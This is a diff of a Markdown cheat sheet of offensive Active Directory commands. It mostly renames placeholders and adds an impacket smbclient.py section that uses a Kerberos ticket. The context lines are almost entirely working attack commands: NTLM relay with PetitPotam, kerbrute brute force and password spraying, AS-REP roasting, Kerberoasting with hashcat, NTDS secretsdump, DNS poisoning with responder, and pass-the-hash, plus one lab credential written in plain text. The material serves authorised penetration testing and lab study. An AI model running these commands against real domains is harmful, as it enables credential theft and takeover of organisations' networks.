@@ -63,7 +63,7 @@ NTLM Relay
 # listening
 python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://<attacker ip> -smb2support  
 # 
-python3 PetitPotam.py -d <domain> -u <user> -p <password> <attacker ip> <target ip>
+python3 PetitPotam.py -d <domain> -u <username> -p <password> <attacker ip> <target ip>
 ```
 
 Dumping LDAP
@@ -71,7 +71,7 @@ Dumping LDAP
 ```shell
 ldapsearch -LLL -x -H ldap://<target ip> -b '' -s base '(objectclass=*)'
 # with credential, e.g., domain = test.local
-ldapsearch -H ldap://<target ip> -x -W -D "<user>@test.local" -b "dc=<test>,dc=<local>"
+ldapsearch -H ldap://<target ip> -x -W -D "<username>@test.local" -b "dc=<test>,dc=<local>"
 # check the dump file's content, e.g., domain_users.json, the value of key "info"
 ldapdomaindump -u '<domain>\<username>' -p '<password>' <HOSTNAME or target ip>
 ```
@@ -86,7 +86,7 @@ Read gMSA password (```ReadGMSAPassword``` and ```AllowedToDelegate``` rights) (
 
 ```
 git clone https://github.com/micahvandeusen/gMSADumper.git
-python3 gMSADumper.py -u <user> -p <password> -d <domain>
+python3 gMSADumper.py -u <username> -p <password> -d <domain>
 ```
 
 enumerate domain usernames
@@ -97,7 +97,7 @@ kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> userenum 
 # 2 valid users
 kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt | grep "USERNAME" | cut -f1 -d"@" | cut -f4 -d":" | tr -d "[:blank:]" > /tmp/users.txt
 # bruteuser
-./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> bruteuser ~/Documents/rockyou.txt <user>
+./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> bruteuser ~/Documents/rockyou.txt <username>
 # passwordspray
 ./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> passwordspray <userlist> '<password>'
 ```
@@ -105,8 +105,8 @@ kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt 
 [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
 
 ```shell
-python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -usersfile <userlist> -format hashcat -outputfile <hashes>
-python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -format hashcat -outputfile <hashes>
+python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -usersfile <userlist> -format hashcat -outputfile <hashes>
+python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -format hashcat -outputfile <hashes>
 ```
 
 change password (STATUS_PASSWORD_MUST_CHANGE)
@@ -118,7 +118,7 @@ smbpasswd -U <user_name> -r <target ip>
 mount Windows shares
 
 ```shell
-mount -t cifs //<target ip>/<folder> <attacker folder> -o username=<user>
+mount -t cifs //<target ip>/<folder> <attacker folder> -o username=<username>
 ```
 
 ### :open_file_folder: BloodHound
@@ -287,7 +287,7 @@ psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.
 
 ```shell
 # add AD Integrated DNS records
-python3 dnstool.py -u '<domain>\<user>' -p <password> <target ip> -a add -r <TARGETRECORD> -d <attacker ip> -t A
+python3 dnstool.py -u '<domain>\<username>' -p <password> <target ip> -a add -r <TARGETRECORD> -d <attacker ip> -t A
 # get information in a few minutes
 responder -I tun0
 ```
@@ -300,7 +300,7 @@ responder -I tun0
 # 1
 secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
 # 2
-impacket-secretsdump <username>:<password>@<domain or IP> -dc-ip <DOMAINCONTROL IP>
+impacket-secretsdump <username>:<password>@<domain or IP> -dc-ip <domain controller ip>
 ```
 
 [getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py): get a Kerberos ticket and use it to access other services
@@ -311,7 +311,7 @@ sudo service virtualbox-guest-utils stop
 # synchronize with server time
 sudo ntpdate <target ip>
 #
-getTGT.py -hashes '<LMHASH:NTHASH>' <domain>/<user>
+getTGT.py -hashes '<LMHASH:NTHASH>' <domain>/<username>
 # Kerberos credentials cache
 export KRB5CCNAME=<username>@<domain>.ccache
 export KRB5CCNAME=<TGT_ccache_file>
@@ -344,15 +344,32 @@ service logon account with SPN services
 
 ```
 # valid domain credentials
-python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target ip> 
+python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <domain controller ip> 
 ```
 
 ```
-python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target ip> -request -output <hashfile>
+python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <domain controller ip> -request -output <hashfile>
 ```
 
 ```
 hashcat -a 0 -m 13100 <hashfile> ~/Documents/rockyou.txt       
+```
+
+### :open_file_folder: impacket smbclient.py
+
+different from the smb tool smbclient
+
+```shell
+python3 getTGT.py <domain>/<username>:<password> -k -dc-ip <domain controller ip>
+# -k Use Kerberos authentication.
+```
+
+```
+export KRB5CCNAME=<username>.ccache
+```
+
+```
+python3 smbclient.py -no-pass -k <domain>/<username>@<targetName or address>
 ```
 
 ### :open_file_folder: Test Environment
